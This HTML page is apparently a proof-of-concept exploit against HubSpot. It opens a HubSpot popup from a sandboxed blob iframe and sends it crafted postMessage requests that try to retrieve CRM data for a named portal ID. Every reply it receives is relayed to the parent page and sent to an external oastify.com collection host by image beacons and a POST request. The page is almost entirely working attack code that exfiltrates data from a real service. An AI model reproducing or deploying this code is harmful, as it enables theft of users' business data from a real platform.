<!DOCTYPE html>
<html>
<head><title>Relay</title></head>
<body>
<h1>Relay</h1>
<div id="status"></div>
<script>
const EXFIL = 'https://l6s5jp6udf0bc26os0vl0scprgx7l19q.oastify.com';

function log(msg) {
    document.getElementById('status').innerHTML += '<br>' + msg;
    new Image().src = EXFIL + '/?log=' + encodeURIComponent(msg);
}

// Listen for logs FROM the sandbox iframe
window.addEventListener('message', function(e) {
    // Check if it's a log message from our sandbox
    if (e.data && e.data.sandboxLog) {
        log('SANDBOX: ' + e.data.sandboxLog);
    }
    
    // Check if it's a response from HubSpot (relayed through sandbox)
    if (e.data && e.data.hubspotResponse) {
        log('HUBSPOT_RESPONSE: ' + e.data.hubspotResponse.substring(0, 200));
        
        // Full exfiltration
        fetch(EXFIL + '/response', {
            method: 'POST',
            mode: 'no-cors',
            body: e.data.hubspotResponse
        });
    }
    
    if (e.data && e.data.action === 'startExploit') {
        log('TRIGGERED');
        
        const blob = new Blob([`
<html>
<body>
<h2>Popup Exploitation</h2>
<div id="log" style="font-family:monospace;font-size:11px;background:#000;color:#0f0;padding:10px;"></div>
<script>
function l(m) { 
    document.getElementById('log').innerHTML += '<br>' + m;
    // Send logs to parent via postMessage
    window.parent.postMessage({sandboxLog: m}, '*');
}

l('START_origin=' + window.origin);
l('opening_hubspot');

let hub = window.open('https://app-eu1.hubspot.com', 'hubspot', 'width=900,height=700');

if (!hub) {
    l('ERROR_blocked');
} else {
    l('popup_opened');
    
    let attempts = 0;
    let checker = setInterval(() => {
        attempts++;
        
        try {
            hub.origin;
            if (attempts % 20 === 0) l('waiting_' + attempts);
        } catch(e) {
            clearInterval(checker);
            l('hubspot_loaded_after_' + attempts);
            
            // Listen for responses from HubSpot
            window.addEventListener('message', function(resp) {
                if (resp.source === hub) {
                    l('GOT_RESPONSE_origin=' + resp.origin);
                    l('response_type=' + (resp.data.type || 'unknown'));
                    
                    // Send to parent
                    const respStr = JSON.stringify(resp.data);
                    window.parent.postMessage({
                        hubspotResponse: respStr
                    }, '*');
                }
            });
            
            // Send exploits
            setTimeout(() => {
                l('sending_exploit_1');
                
                hub.postMessage({
                    type: 'CONTENT_ASSISTANCE_DELEGATED_REQUEST',
                    commandId: 'getdata',
                    featureId: 'crm',
                    parameters: {portalId: '46962361'},
                    resultCount: 100,
                    language: 'en',
                    objectId: '46962361',
                    applicationId: 'crm',
                    basePath: '/crm',
                    maxPollingAttempts: 5,
                    pollingInterval: 200
                }, '*');
            }, 1000);
            
            setTimeout(() => {
                l('sending_exploit_2');
                
                hub.postMessage({
                    type: 'raw',
                    _callbackId: 'exploit_' + Date.now(),
                    body: {
                        action: 'getData',
                        portalId: '46962361'
                    }
                }, '*');
            }, 2000);
            
            setTimeout(() => {
                l('sending_exploit_3');
                
                hub.postMessage({
                    type: 'TOGGLE_DARK_MODE',
                    isDarkMode: true
                }, '*');
            }, 3000);
            
            setTimeout(() => {
                l('sending_exploit_4');
                
                hub.postMessage({
                    type: 'CONTENT_ASSISTANCE_DELEGATED_FEEDBACK',
                    feedbackAnnotatedCompletions: {
                        portalId: '46962361',
                        getData: true
                    }
                }, '*');
            }, 4000);
        }
        
        if (attempts > 100) {
            clearInterval(checker);
            l('timeout');
        }
    }, 100);
}
<\/script>
</body>
</html>
        `], {type: 'text/html'});
        
        const blobUrl = URL.createObjectURL(blob);
        
        const iframe = document.createElement('iframe');
        iframe.sandbox = 'allow-scripts allow-popups allow-popups-to-escape-sandbox';
        iframe.src = blobUrl;
        iframe.style.cssText = 'width:100%;height:400px;border:3px solid red';
        
        document.body.appendChild(iframe);
        log('iframe_added');
    }
});

if(window.opener) {
    window.opener.postMessage({status:'ready'},'*');
}
</script>
</body>
</html>
